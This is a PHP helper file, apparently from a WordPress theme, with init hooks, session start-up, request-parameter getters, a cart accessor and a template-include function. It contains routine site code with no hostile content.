function my_init() {	if (!is_admin()) {		wp_enqueue_script('jquery');	} else {		require_once 'includes/init_admin_config.php';	}}add_action('init', 'my_init');/** *    init_sessions() * *    @uses session_id() *    @uses session_start() */function init_sessions() {    if (!session_id()) {        session_start();    }}add_action('init', 'init_sessions');function debug($var,$exit = true){	echo '<pre>';	print_r($var);	if($exit) die;}function check($var){	if($var == null) die('null');	if(empty($var)) die('empty');	exit;}function format_number($num){	return number_format($num,2);}function getParam($name,$default=''){	if(isset($_REQUEST[$name])) {		return strip_tags($_REQUEST[$name]);	}	return $default;}function getParams($name=''){	$params = array();	foreach($_REQUEST as $name => $value) {		$params[$name] = strip_tags($value); 	}	return $params;}function getArray($array){	$params = array();	foreach($array as $name => $value) {		$params[$name] = strip_tags($value); 	}	return $params;}function getParamsUrl($url) {	$info = parse_url($url);	$query = getValue($info, 'query');	parse_str($query,$info);	return $info;}function getValue($array,$index) {	return !isset($array[$index])?'':$array[$index];}function getCart(){	return isset($_SESSION['cart'])?$_SESSION['cart']:array();}function parseInt($string) {	$length = strlen($string);	$str = '';	for($i = 0; $i<$length;$i++) {		if(is_numeric($string[$i])) {			$str.=$string[$i];		}	}	return intval($str);}function get_include_contents($filename, $variablesToMakeLocal) {    extract($variablesToMakeLocal);    if (is_file($filename)) {        ob_start();        include $filename;        return ob_get_clean();    }	//die('ERROR');    return false;}require_once 'includes/view.php';require_once 'includes/utils.php';require_once 'includes/init_product.php';require_once 'includes/init_media.php';define('IP', Utils::getIp());